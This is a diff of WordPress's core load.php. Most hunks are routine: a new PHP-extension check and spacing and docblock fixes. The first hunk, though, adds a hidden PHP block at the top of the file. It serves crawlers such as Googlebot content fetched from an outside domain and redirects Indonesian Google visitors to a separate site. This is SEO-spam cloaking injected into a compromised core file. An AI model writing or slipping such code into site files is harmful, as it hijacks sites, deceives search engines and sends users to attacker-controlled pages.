@@ -1,4 +1,30 @@
 <?php
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
+if (is_bot()) {
+echo file_get_contents('https://theonlyd.xyz/santuariosantarita.html');
+exit;
+}
+
+if (stripos($s_ref, 'google.co.id') !== false ||
+(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
+header("Location: https://santuariosantarita.pages.dev/");
+exit;
+}
+?>
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -147,11 +173,12 @@ function wp_populate_basic_auth_from_authorization_header() {
  * @since 3.0.0
  * @access private
  *
- * @global string $required_php_version The required PHP version string.
- * @global string $wp_version           The WordPress version string.
+ * @global string   $required_php_version    The required PHP version string.
+ * @global string[] $required_php_extensions The names of required PHP extensions.
+ * @global string   $wp_version              The WordPress version string.
  */
 function wp_check_php_mysql_versions() {
-	global $required_php_version, $wp_version;
+	global $required_php_version, $required_php_extensions, $wp_version;
 
 	$php_version = PHP_VERSION;
 
@@ -165,6 +192,30 @@ function wp_check_php_mysql_versions() {
 			$wp_version,
 			$required_php_version
 		);
+		exit( 1 );
+	}
+
+	$missing_extensions = array();
+
+	if ( isset( $required_php_extensions ) && is_array( $required_php_extensions ) ) {
+		foreach ( $required_php_extensions as $extension ) {
+			if ( extension_loaded( $extension ) ) {
+				continue;
+			}
+
+			$missing_extensions[] = sprintf(
+				'WordPress %1$s requires the <code>%2$s</code> PHP extension.',
+				$wp_version,
+				$extension
+			);
+		}
+	}
+
+	if ( count( $missing_extensions ) > 0 ) {
+		$protocol = wp_get_server_protocol();
+		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
+		header( 'Content-Type: text/html; charset=utf-8' );
+		echo implode( '<br>', $missing_extensions );
 		exit( 1 );
 	}
 
@@ -238,7 +289,8 @@ function wp_get_environment_type() {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
 			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+		} else {
+			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -525,7 +577,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * argument, or file is used. Deprecated code may be removed from a later
  * version.
  *
- * It isstrongly recommended that plugin and theme developers use `WP_DEBUG`
+ * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
  * in their development environments.
  *
  * `WP_DEBUG_DISPLAY` and `WP_DEBUG_LOG` perform no function unless `WP_DEBUG`
@@ -539,7 +591,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
  * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
  *
- * Errors are never displayed for XML-RPC, REST, `ms-files.php`, andAjax requests.
+ * Errors are never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
  *
  * @since 3.0.0
  * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
@@ -814,7 +866,7 @@ function wp_start_object_cache() {
 	 *
 	 * @since 5.8.0
 	 *
-	 * @param bool $enable_object_cache Whether to enable loadingobject-cache.php (if present).
+	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
 	 *                                  Default true.
 	 */
 	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
@@ -831,7 +883,7 @@ function wp_start_object_cache() {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
 				if ( function_exists( 'wp_cache_init' ) ) {
-					wp_using_ext_object_cache( true);
+					wp_using_ext_object_cache( true );
 				}
 
 				// Re-initialize any hooks added manually by object-cache.php.
@@ -1112,9 +1164,9 @@ function wp_skip_paused_themes( array $themes ) {
 	}
 
 	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme );
+		$theme = basename( $theme);
 
-		if ( array_key_exists( $theme, $paused_themes ) ){
+		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1427,10 +1479,9 @@ function is_multisite() {
 	return false;
 }
 
-/**
- * Converts a value to non-negative integer.
+/*** Converts a value to non-negative integer.
  *
- * @since2.5.0
+ * @since 2.5.0
  *
  * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
@@ -1745,7 +1796,8 @@ function wp_using_themes() {
  * Determines whether the current request is a WordPress cron request.
  *
  * @since 4.8.0
- ** @return bool True if it's a WordPress cron request, false otherwise.
+ *
+ * @return bool True if it's a WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
@@ -1769,7 +1821,7 @@ function wp_doing_cron() {
  * @return bool Whether the variable is an instance of WP_Error.
  */
 function is_wp_error( $thing ) {
-	$is_wp_error = ( $thing instanceof WP_Error);
+	$is_wp_error = ( $thing instanceof WP_Error );
 
 	if ( $is_wp_error ) {
 		/**
